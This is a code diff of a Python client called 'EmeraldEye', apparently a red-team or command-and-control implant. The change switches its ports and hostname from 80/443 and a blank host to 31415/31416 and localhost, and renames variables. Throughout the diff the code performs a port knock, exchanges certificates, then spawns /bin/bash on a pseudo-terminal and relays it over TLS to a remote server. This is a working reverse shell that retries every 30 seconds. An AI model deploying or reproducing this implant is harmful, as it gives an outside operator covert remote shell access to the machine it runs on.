@@ -8,11 +8,11 @@ import ssl
 import os 
 import select 
 
-KNOCK_PORT = 80
-TLS_PORT = 443
-HOST = ""
-
-class EmeraldEye():
+KNOCK_PORT = 31415
+TLS_PORT = 31416
+#HOST = ""
+HOST = "127.0.0.1"
+class EmeraldEyeClient():
 
     def __init__(self, host):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -20,10 +20,10 @@ class EmeraldEye():
         self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.knock_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.host = host
-        self.tls_private_key_file = "my.key"
-        self.tls_cert_file = "my.crt"
-        self.tls_other_crt_file = "other.crt"
-        self.server_hostname='example.com'
+        self.tls_private_key_file = "client.key"
+        self.tls_cert_file = "client.crt"
+        self.tls_other_crt_file = "server.crt"
+        self.server_hostname='emeraldeye.io'
         self.crt = self.cert_gen()
 
     def cert_gen(self, validityEndInSeconds=10*365*24*60*60):
@@ -49,42 +49,38 @@ class EmeraldEye():
             context.load_cert_chain(certfile=self.tls_cert_file, keyfile=self.tls_private_key_file)
             ss = context.wrap_socket(self.sock, server_side=False, server_hostname=self.server_hostname)
             ss.connect((self.host, TLS_PORT))
-            master, slave = pty.openpty()
-
+            controller, spy = pty.openpty()
             bash = subprocess.Popen("/bin/bash",
                                     preexec_fn=os.setsid,
-                                    stdin=slave,
-                                    stdout=slave,
-                                    stderr=slave,
+                                    stdin=spy,
+                                    stdout=spy,
+                                    stderr=spy,
                                     universal_newlines=True)
-            
             time.sleep(0.5)  
             while bash.poll() is None:
-                r, w, e = select.select([ss, master], [], [])
-                if master in r:
-                    out = os.read(master, 2048)
-                    if out:
-                        out += b'-emrdeye'
-                        print("Data Sent: " + out.decode())
-                        ss.write(out)
-                elif ss in r:
+                buffer, _, _ = select.select([ss, controller], [], [])
+                if controller in buffer:
+                    io_read = os.read(controller, 2048)
+                    if io_read:
+                        io_read += b'-emrdeye'
+                        print("Data Sent: " + io_read.decode())
+                        ss.write(io_read)
+                elif ss in buffer:
                     try:
-                        data = ss.recv(1024)
-                        print("Data Received: " + data.decode())
+                        packet = ss.recv(1024)
+                        print("packet Received: " + packet.decode())
                     except ssl.SSLError as e:
                         if e.errno == ssl.SSL_ERROR_WANT_READ:
                             continue
                         raise
-                    if not data:  # End of file.
+                    if not packet:
                         break
-                    data_left = ss.pending()
-                    while data_left:
-                        data += ss.recv(data_left)
-                        data_left = ss.pending()
-                    os.write(master, data)
+                    packet_left = ss.pending()
+                    while packet_left:
+                        packet += ss.recv(packet_left)
+                        packet_left = ss.pending()
+                    os.write(controller, packet)
                 
-
-
     def health_check(self):
         print("Trying to connect...")
         with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
@@ -92,16 +88,16 @@ class EmeraldEye():
                 s.connect((self.host, KNOCK_PORT))
                 print("Connected to :" + self.host)
                 s.sendall(b'Knock')
-                data = s.recv(1024)
-                if data == b'Knock':
-                    print("Data Received: " + data.decode())
+                packet = s.recv(1024)
+                if packet == b'Knock':
+                    print("packet Received: " + packet.decode())
                     pass
-                elif b'crt-' in data:
-                    print("Data Received: " + data.decode())
-                    other_crt = data.split(b'crt-')[1]
+                elif b'crt-' in packet:
+                    print("packet Received: " + packet.decode())
+                    other_crt = packet.split(b'crt-')[1]
                     time.sleep(0.25) 
                     crt = b'crt-'+self.crt
-                    print("Cert Sent")
+                    print("Sending cert to server...")
                     s.sendall(crt)
                     resv = b''
                     while resv == b'':
@@ -115,12 +111,12 @@ class EmeraldEye():
                     threading.Thread(target=self.interact(), args=()).start()              
                 else:
                     print("Server did not get cert, will retry")
-                    print("Agent Recieved unxpected data " + str(data))
+                    print("Agent Recieved unxpected data " + str(packet))
             except Exception as e:
                 print("Can't reach server will retry in 30 seconds")
 
 def main():
-    k = EmeraldEye(HOST)
+    k = EmeraldEyeClient(HOST)
     while True:
         k.health_check()
         time.sleep(30)
